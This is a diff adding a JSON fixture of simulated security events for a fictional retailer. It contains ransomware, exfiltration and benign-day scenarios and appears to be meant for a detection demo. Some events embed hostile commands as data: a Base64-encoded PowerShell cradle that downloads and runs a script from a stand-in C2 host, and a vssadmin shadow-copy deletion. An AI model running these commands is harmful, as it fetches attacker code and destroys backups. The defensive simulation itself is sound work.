@@ -1,0 +1,327 @@
+{
+  "scenarios": {
+    "ransomware_chain": {
+      "title": "Ransomware Chain (Password Spray -> New Device -> Forwarding Rule -> Admin Escalation -> Shadow Copy Deletion)",
+      "description": "Multi-stage intrusion chain against Finance Lead Sarah Connors, illustrating early detection 3 hours and 15 minutes before ransomware deployment.",
+      "target_user": "sarah.connors@smb-retail.com",
+      "target_system": "WKSTN-FIN-04",
+      "expected_outcome": "Critical Breach (Severity: Red 95/100)",
+      "lead_time": "3 hours 15 minutes",
+      "events": [
+        {
+          "event_id": "EVT-1001",
+          "timestamp": "2026-10-25T08:15:20Z",
+          "event_type": "password_spray_burst",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Kali-Linux-Host",
+          "source_service": "AzureAD",
+          "details": {
+            "failed_attempts": 18,
+            "time_window_seconds": 60,
+            "target_services": ["Office365", "AzurePortal", "ExchangeOnline"],
+            "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+          },
+          "raw_message": "18 consecutive failed login attempts detected within 60s for sarah.connors@smb-retail.com from 185.220.101.45"
+        },
+        {
+          "event_id": "EVT-1002",
+          "timestamp": "2026-10-25T08:22:45Z",
+          "event_type": "impossible_travel_login",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Unknown-MacBook-Spoof",
+          "source_service": "AzureAD",
+          "details": {
+            "previous_location": "Chicago, IL, USA",
+            "previous_timestamp": "2026-10-25T07:45:00Z",
+            "distance_km": 7800,
+            "speed_kmh": 12480,
+            "status": "Login Succeeded"
+          },
+          "raw_message": "User sarah.connors authenticated from St. Petersburg, Russia 37 minutes after legitimate login in Chicago, IL"
+        },
+        {
+          "event_id": "EVT-1003",
+          "timestamp": "2026-10-25T08:24:10Z",
+          "event_type": "new_device_enrolled",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Unregistered-Host-8891",
+          "source_service": "IntuneMDM",
+          "details": {
+            "os": "macOS Sonoma (Emulated)",
+            "compliance_status": "Non-Compliant",
+            "certificate_trusted": false
+          },
+          "raw_message": "Unregistered endpoint DEV-UNKNOWN-8891 enrolled without corporate MDM certificate verification"
+        },
+        {
+          "event_id": "EVT-1004",
+          "timestamp": "2026-10-25T08:35:10Z",
+          "event_type": "mfa_push_flood_bypass",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Unregistered-Host-8891",
+          "source_service": "OktaSSO",
+          "details": {
+            "push_count_last_10m": 14,
+            "result": "Approved_After_Repeated_Prompts",
+            "mfa_method": "Authenticator_Push"
+          },
+          "raw_message": "14 MFA push notifications sent in 6 minutes before user accepted approval prompt"
+        },
+        {
+          "event_id": "EVT-1005",
+          "timestamp": "2026-10-25T09:12:00Z",
+          "event_type": "inbox_forwarding_rule_created",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Unregistered-Host-8891",
+          "source_service": "ExchangeOnline",
+          "details": {
+            "rule_name": "Auto-Archive-Invoices",
+            "forward_to": "attacker-dropzone@darkmail.onion",
+            "filter_keywords": ["invoice", "wire", "payroll", "banking", "urgent"],
+            "delete_local_copy": true
+          },
+          "raw_message": "Exchange rule created: Silently forward incoming finance/wire emails to external recipient attacker-dropzone@darkmail.onion"
+        },
+        {
+          "event_id": "EVT-1006",
+          "timestamp": "2026-10-25T10:04:30Z",
+          "event_type": "privilege_escalation_admin",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "185.220.101.45",
+          "geo_location": "St. Petersburg, Russia",
+          "device_id": "DEV-UNKNOWN-8891",
+          "device_name": "Unregistered-Host-8891",
+          "source_service": "AzureAD",
+          "details": {
+            "role_granted": "Global Administrator",
+            "assigned_by": "sarah.connors@smb-retail.com (Self-Elevation via stolen tenant app secret)",
+            "tier": "Tier-0"
+          },
+          "raw_message": "User sarah.connors assigned Global Administrator role via API secret injection without change ticket"
+        },
+        {
+          "event_id": "EVT-1007",
+          "timestamp": "2026-10-25T10:45:15Z",
+          "event_type": "encoded_powershell_executed",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "192.168.1.104",
+          "geo_location": "Internal LAN (Lateral Pivot)",
+          "device_id": "WKSTN-FIN-04",
+          "device_name": "WKSTN-FIN-04",
+          "source_service": "WindowsDefenderEDR",
+          "details": {
+            "process": "powershell.exe",
+            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AHAAbABvAGkAdAAtAGMAMgAuAG4AZQB0AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "parent_process": "wmic.exe",
+            "integrity_level": "SYSTEM"
+          },
+          "raw_message": "Obfuscated Base64 PowerShell execution spawned by WMIC with SYSTEM integrity on WKSTN-FIN-04"
+        },
+        {
+          "event_id": "EVT-1008",
+          "timestamp": "2026-10-25T11:30:00Z",
+          "event_type": "shadow_copy_deleted",
+          "user": "sarah.connors@smb-retail.com",
+          "ip_address": "192.168.1.104",
+          "geo_location": "Internal LAN (Target Host)",
+          "device_id": "WKSTN-FIN-04",
+          "device_name": "WKSTN-FIN-04",
+          "source_service": "WindowsDefenderEDR",
+          "details": {
+            "utility": "vssadmin.exe",
+            "arguments": "delete shadows /all /quiet",
+            "threat_classification": "Ransomware Inhibit System Recovery (T1490)",
+            "files_encrypted_next": "Active network shares mapped to Z:\\Finance"
+          },
+          "raw_message": "Volume Shadow Copies deleted via vssadmin.exe /all /quiet - Final precursor to ransomware file locking"
+        }
+      ]
+    },
+    "data_exfiltration_chain": {
+      "title": "Data Exfiltration Chain (Phishing -> Credential Theft -> Mass Cloud Download -> Dark Web Staging)",
+      "description": "Stealthy credential-theft campaign resulting in unauthorized extraction of sensitive corporate customer databases.",
+      "target_user": "alex.morgan@smb-retail.com",
+      "target_system": "CLOUD-SHAREPOINT-CORE",
+      "expected_outcome": "High Severity Incident (Severity: Red 85/100)",
+      "lead_time": "1 hour 25 minutes",
+      "events": [
+        {
+          "event_id": "EVT-2001",
+          "timestamp": "2026-10-25T14:10:00Z",
+          "event_type": "password_spray_burst",
+          "user": "alex.morgan@smb-retail.com",
+          "ip_address": "91.240.118.12",
+          "geo_location": "Amsterdam, Netherlands",
+          "device_id": "DEV-TOR-4401",
+          "device_name": "TOR-EXIT-NODE",
+          "source_service": "AzureAD",
+          "details": {
+            "failed_attempts": 9,
+            "time_window_seconds": 45,
+            "target_services": ["SharePoint", "OneDrive"]
+          },
+          "raw_message": "Repeated credential validation attempts against SharePoint gateway from TOR exit node 91.240.118.12"
+        },
+        {
+          "event_id": "EVT-2002",
+          "timestamp": "2026-10-25T14:18:22Z",
+          "event_type": "new_device_enrolled",
+          "user": "alex.morgan@smb-retail.com",
+          "ip_address": "91.240.118.12",
+          "geo_location": "Amsterdam, Netherlands",
+          "device_id": "DEV-TOR-4401",
+          "device_name": "CloudShell-Bypass-Node",
+          "source_service": "AzureAD",
+          "details": {
+            "os": "Linux Ubuntu Headless",
+            "compliance_status": "Unmanaged"
+          },
+          "raw_message": "Unmanaged Linux instance enrolled into user identity profile from anonymous proxy"
+        },
+        {
+          "event_id": "EVT-2003",
+          "timestamp": "2026-10-25T14:40:00Z",
+          "event_type": "abnormal_offhours_access",
+          "user": "alex.morgan@smb-retail.com",
+          "ip_address": "91.240.118.12",
+          "geo_location": "Amsterdam, Netherlands",
+          "device_id": "DEV-TOR-4401",
+          "device_name": "CloudShell-Bypass-Node",
+          "source_service": "Office365Audit",
+          "details": {
+            "local_time_at_user_tz": "03:40 AM (Sunday)",
+            "normal_work_window": "08:30 AM - 05:30 PM (Mon-Fri)",
+            "resource_queried": "Customer_PII_Vault_2026.xlsx"
+          },
+          "raw_message": "Anomalous high-volume document access registered at 03:40 AM outside standard business schedule"
+        },
+        {
+          "event_id": "EVT-2004",
+          "timestamp": "2026-10-25T15:05:12Z",
+          "event_type": "mass_file_download",
+          "user": "alex.morgan@smb-retail.com",
+          "ip_address": "91.240.118.12",
+          "geo_location": "Amsterdam, Netherlands",
+          "device_id": "DEV-TOR-4401",
+          "device_name": "CloudShell-Bypass-Node",
+          "source_service": "SharePointOnline",
+          "details": {
+            "files_downloaded_count": 1420,
+            "total_bytes_mb": 8450,
+            "target_folder": "/Shared Documents/Customer Contracts & Credit Applications"
+          },
+          "raw_message": "Spike in bulk download: 1,420 confidential client files (8.45 GB) downloaded in under 8 minutes"
+        }
+      ]
+    },
+    "normal_day": {
+      "title": "Normal Day (Quiet Logs & Routine Business Operations)",
+      "description": "Standard business operations: regular employee logins, email syncs, Teams meetings, and authorized document edits.",
+      "target_user": "david.kim@smb-retail.com",
+      "target_system": "WKSTN-HQ-012",
+      "expected_outcome": "Healthy / Low Risk (Severity: Green 10/100)",
+      "lead_time": "N/A (No Threat Detected)",
+      "events": [
+        {
+          "event_id": "EVT-0001",
+          "timestamp": "2026-10-25T08:30:15Z",
+          "event_type": "user_login_success",
+          "user": "david.kim@smb-retail.com",
+          "ip_address": "192.168.1.42",
+          "geo_location": "Chicago, IL, USA",
+          "device_id": "DEV-CORP-012",
+          "device_name": "WKSTN-HQ-012",
+          "source_service": "AzureAD",
+          "details": {
+            "auth_method": "Windows Hello / FIDO2 Key",
+            "status": "Success",
+            "compliance_status": "Compliant"
+          },
+          "raw_message": "Successful biometric sign-in on corporate registered workstation DEV-CORP-012"
+        },
+        {
+          "event_id": "EVT-0002",
+          "timestamp": "2026-10-25T08:35:20Z",
+          "event_type": "user_login_success",
+          "user": "rachel.green@smb-retail.com",
+          "ip_address": "192.168.1.45",
+          "geo_location": "Chicago, IL, USA",
+          "device_id": "DEV-CORP-044",
+          "device_name": "WKSTN-HQ-044",
+          "source_service": "AzureAD",
+          "details": {
+            "auth_method": "Microsoft Authenticator Notification",
+            "status": "Success",
+            "compliance_status": "Compliant"
+          },
+          "raw_message": "Routine SSO authentication completed for Office 365 services"
+        },
+        {
+          "event_id": "EVT-0003",
+          "timestamp": "2026-10-25T09:15:00Z",
+          "event_type": "routine_email_sync",
+          "user": "david.kim@smb-retail.com",
+          "ip_address": "192.168.1.42",
+          "geo_location": "Chicago, IL, USA",
+          "device_id": "DEV-CORP-012",
+          "device_name": "WKSTN-HQ-012",
+          "source_service": "ExchangeOnline",
+          "details": {
+            "protocol": "MAPI/HTTP",
+            "mailbox_items_synced": 34
+          },
+          "raw_message": "Exchange mailbox sync completed normally over internal company WiFi"
+        },
+        {
+          "event_id": "EVT-0004",
+          "timestamp": "2026-10-25T10:00:12Z",
+          "event_type": "routine_document_edit",
+          "user": "rachel.green@smb-retail.com",
+          "ip_address": "192.168.1.45",
+          "geo_location": "Chicago, IL, USA",
+          "device_id": "DEV-CORP-044",
+          "device_name": "WKSTN-HQ-044",
+          "source_service": "SharePointOnline",
+          "details": {
+            "document": "Q4_Retail_Inventory_Catalog.xlsx",
+            "action": "FileModified",
+            "version": "1.4"
+          },
+          "raw_message": "Authorized team document modification saved in SharePoint document library"
+        },
+        {
+          "event_id": "EVT-0005",
+          "timestamp": "2026-10-25T11:00:00Z",
+          "event_type": "routine_scheduled_antivirus_scan",
+          "user": "system",
+          "ip_address": "127.0.0.1",
+          "geo_location": "Localhost",
+          "device_id": "DEV-CORP-012",
+          "device_name": "WKSTN-HQ-012",
+          "source_service": "WindowsDefenderEDR",
+          "details": {
+            "scan_type": "QuickScan",
+            "threats_found": 0,
+            "duration_seconds": 92
+          },
+          "raw_message": "Defender quick scan completed: 0 threats detected, definitions up to date"
+        }
+      ]
+    }
+  }
+}
